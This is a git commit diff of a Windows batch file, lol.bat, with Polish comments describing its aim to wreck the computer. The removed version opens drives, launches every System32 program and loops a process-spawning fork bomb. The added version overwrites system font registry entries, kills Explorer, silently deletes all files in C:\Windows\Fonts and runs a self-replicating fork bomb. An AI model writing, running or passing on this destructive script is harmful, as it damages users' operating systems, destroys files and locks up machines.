c54ebb33732737a71c19dd78ecfd91744df540aa
xoxojojo <kornelzietek7@gmail.com>
2026-04-03 18:19:36 +0200

    Update lol.bat

--- lol.bat
+++ lol.bat
@@ -1,36 +1,30 @@
 @echo off
-title CHIPS EXPLOSION
+title !@#$%^&*()_+ SYSTEM CORRUPTION !@#$%^&*()_+
 color 0c
 
-echo [!] UWAGA: Zaraz otworze WSZYSTKO co znajde na dysku C:
-echo [!] To ZAWIESI Twoj komputer w kilka sekund.
-pause
+echo [!] ROZPOCZYNAM DESTRUKCJE LITER...
+echo [!] !@#$%^&*()_+ !@#$%^&*()_+ !@#$%^&*()_+
 
-:: --- 1. OTWIERANIE DYSKOW I FOLDEROW ---
-start C:\
-start %SystemRoot%
-start %SystemRoot%\System32
-start %UserProfile%\Pulpit
+:: --- 1. NISZCZENIE CZCIONEK SYSTEMOWYCH (REJESTR) ---
+:: To sprawi, ze po restarcie Explorera napisy beda wygladac jak bloto
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /v "Arial (TrueType)" /t REG_SZ /d "!@#$%^&*" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /v "Tahoma (TrueType)" /t REG_SZ /d "!@#$%^&*" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /v "MS Sans Serif 8,10,12,14,18,24" /t REG_SZ /d "!@#$%^&*" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontSubstitutes" /v "MS Shell Dlg" /t REG_SZ /d "!@#$%^&*" /f >nul
 
-:: --- 2. OTWIERANIE WSZYSTKICH PROGRAMOW Z SYSTEM32 ---
-:: To jest najbardziej zabojcze - otworzy setki procesow naraz
-cd /d %SystemRoot%\System32
-for %%f in (*.exe) do (
-    echo Otwieram: %%f
-    start %%f
-)
-
-:: --- 3. SZUKANIE I OTWIERANIE NA PULPICIE ---
-cd /d "%UserProfile%\Pulpit"
-for %%g in (*.*) do (
-    start %%g
-)
-
-:: --- 4. PETLA SMIERCI (FORK BOMB) ---
-:: Jesli komputer jeszcze dycha, to teraz przestanie
-:payload
+:: --- 2. RESTART EXPLORERA (Zastosowanie zmian wizualnych) ---
+:: Windows XP sprobuje zaladowac nowe "czcionki" i sie pogubi
+taskkill /f /im explorer.exe >nul 2>&1
 start explorer.exe
-start calc.exe
-start notepad.exe
-start mspaint.exe
-goto payload
+
+:: --- 3. POWOLNE USUWANIE PLIKOW SYSTEMOWYCH ---
+:: Zaczynamy od sterownikow i czcionek, zeby system "glupial" bardziej
+del /q /s C:\Windows\Fonts\*.* >nul 2>&1
+
+:: --- 4. FORKIE PAYLOAD (!@#$%^&*()_+) ---
+:forkie
+start cmd /c "color 0c && echo !@#$%^&*()_+ !@#$%^&*()_+ && pause"
+echo !@#$%^&*()_+ !@#$%^&*()_+ !@#$%^&*()_+
+echo ERROR_!@#$%^&*()_+_FAILED
+start %0
+goto forkie
